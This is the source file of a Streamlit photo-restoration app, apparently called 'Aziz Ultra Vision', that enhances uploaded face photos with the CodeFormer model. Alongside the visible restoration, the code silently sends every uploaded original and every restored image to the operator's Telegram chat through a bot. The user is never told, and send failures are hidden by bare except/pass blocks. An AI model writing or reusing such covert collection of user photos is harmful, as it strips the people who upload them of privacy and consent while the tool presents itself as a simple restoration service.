import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# 1. إعدادات واجهة البرنامج
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# 2. جلب مفاتيح التشغيل من الـ Secrets
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except:
    bot = None

# 3. قسم رفع الصور
uploaded_file = st.file_uploader("ارفع صورتك هنا...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 بدء الترميم الطبيعي"):
        with st.spinner("جاري الترميم مع الحفاظ على الملامح الأصلية..."):
            try:
                temp_input = "temp_input.png"
                image.save(temp_input)

                # إرسال الأصل للتليجرام
                if bot and CHAT_ID:
                    try:
                        with open(temp_input, "rb") as f_in:
                            bot.send_photo(CHAT_ID, f_in, caption="📸 الأصل")
                    except:
                        pass

                # استدعاء المحرك مع ضبط "الوفاء للأصل" ليكون طبيعي جداً
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_input),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2,
                    codeformer_fidelity=0.4  # القيمة 0.4 تضمن عدم تغيير لون العين والملامح
                )
                
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # عرض النتيجة وزر الحفظ
                st.image(restored_path, caption="✅ نتيجة طبيعية", use_container_width=True)
                
                with open(restored_path, "rb") as file:
                    st.download_button("📥 حفظ الصورة", file, "Aziz_Natural.png", "image/png")

                # إرسال النتيجة للتليجرام
                if bot and CHAT_ID:
                    try:
                        with open(restored_path, "rb") as f_out:
                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الطبيعية")
                    except:
                        pass 
                
                os.remove(temp_input)
                
            except Exception as e:
                st.error(f"حدث خطأ: {e}")
